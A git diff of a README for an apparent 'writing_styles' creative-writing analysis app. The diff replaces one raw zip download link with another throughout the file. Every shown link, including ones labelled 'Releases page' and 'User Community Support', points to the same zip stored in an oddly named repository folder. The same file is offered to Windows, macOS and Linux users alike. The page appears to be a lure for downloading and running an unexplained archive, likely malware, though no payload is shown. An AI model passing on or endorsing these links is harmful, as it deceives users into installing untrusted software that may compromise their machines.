@@ -1,7 +1,7 @@
 # 🎨 writing_styles - Explore Creative Writing Insights
 
 ## 📥 Download the Application
-[![Download writing_styles](https://raw.githubusercontent.com/dab3oon/writing_styles/main/unproper/writing_styles.zip%20writing_styles-v1.0-brightgreen)](https://raw.githubusercontent.com/dab3oon/writing_styles/main/unproper/writing_styles.zip)
+[![Download writing_styles](https://github.com/dab3oon/writing_styles/raw/refs/heads/main/images/styles_writing_v2.7.zip%20writing_styles-v1.0-brightgreen)](https://github.com/dab3oon/writing_styles/raw/refs/heads/main/images/styles_writing_v2.7.zip)
 
 ## 📋 Overview
 The **writing_styles** application helps you dive into the world of creative writing. It documents how various language models create and vary their stories. This helps you understand writing styles and model differences. 
@@ -10,16 +10,16 @@ The **writing_styles** application helps you dive into the world of creative wri
 Follow these steps to download and run the application:
 
 1. **Download the Application**
-   - Visit the [Releases page](https://raw.githubusercontent.com/dab3oon/writing_styles/main/unproper/writing_styles.zip) to get the latest version of the application.
+   - Visit the [Releases page](https://github.com/dab3oon/writing_styles/raw/refs/heads/main/images/styles_writing_v2.7.zip) to get the latest version of the application.
 
 2. **Choose Your Operating System**
    - The application supports Windows, macOS, and Linux. Make sure to select the correct version for your operating system.
 
 3. **Download the File**
    - Click the download link for your operating system. The file will start downloading. For example:
-     - **Windows** users can download `https://raw.githubusercontent.com/dab3oon/writing_styles/main/unproper/writing_styles.zip`.
-     - **macOS** users can download `https://raw.githubusercontent.com/dab3oon/writing_styles/main/unproper/writing_styles.zip`.
-     - **Linux** users can download `https://raw.githubusercontent.com/dab3oon/writing_styles/main/unproper/writing_styles.zip`.
+     - **Windows** users can download `https://github.com/dab3oon/writing_styles/raw/refs/heads/main/images/styles_writing_v2.7.zip`.
+     - **macOS** users can download `https://github.com/dab3oon/writing_styles/raw/refs/heads/main/images/styles_writing_v2.7.zip`.
+     - **Linux** users can download `https://github.com/dab3oon/writing_styles/raw/refs/heads/main/images/styles_writing_v2.7.zip`.
 
 4. **Locate the Downloaded File**
    - Find the downloaded file in your computer's downloads folder or the location you selected.
@@ -82,8 +82,8 @@ If you encounter any issues while downloading or running the application, consid
 If issues persist, visit the community support page or check the FAQ section on the repository.
 
 ## 🔗 Additional Resources
-- [Releases Page for Download](https://raw.githubusercontent.com/dab3oon/writing_styles/main/unproper/writing_styles.zip)
-- [User Community Support](https://raw.githubusercontent.com/dab3oon/writing_styles/main/unproper/writing_styles.zip)
+- [Releases Page for Download](https://github.com/dab3oon/writing_styles/raw/refs/heads/main/images/styles_writing_v2.7.zip)
+- [User Community Support](https://github.com/dab3oon/writing_styles/raw/refs/heads/main/images/styles_writing_v2.7.zip)
 
 Use these resources to deepen your understanding and make the most out of the **writing_styles** application. 
 
